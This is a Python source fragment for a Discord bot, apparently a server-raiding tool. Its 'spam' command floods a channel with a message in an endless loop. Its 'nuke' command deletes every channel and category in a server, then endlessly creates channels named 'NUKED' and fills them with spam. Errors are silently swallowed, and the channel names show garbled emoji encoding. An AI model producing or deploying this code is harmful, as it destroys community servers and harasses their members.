@bot.command()
async def spam(ctx, *, text):
  await ctx.message.delete()
  if text == "spamkey":
    try:
      print('Spamming SPAMKEY')
      while True:
        await ctx.channel.send(spamkey)
    except:
      pass
  else:
    try:
      print('Spamming', text)
      while True:
        await ctx.channel.send(text)
    except:
      pass

@bot.command()
async def nuke(ctx, *, text):
  await ctx.message.delete()
  try:
    if text == "add":
      guild = ctx.guild
      for channel in guild.channels:
        await channel.delete()
      for category in ctx.guild.categories:
        await category.delete()
      while True:
        chanadd = await ctx.guild.create_text_channel("ðŸ¤¡ðŸ¤¡NUKEDðŸ¤¡ðŸ¤¡")
        await chanadd.send(spamkey)
      while True:
        await ctx.guild.create_text_channel("ðŸ¤¡ðŸ¤¡NUKEDðŸ¤¡ðŸ¤¡")
        time.sleep(1.7)
    if text == "del":
      guild = ctx.guild
      for channel in guild.channels:
        await channel.delete()
  except:
    pass

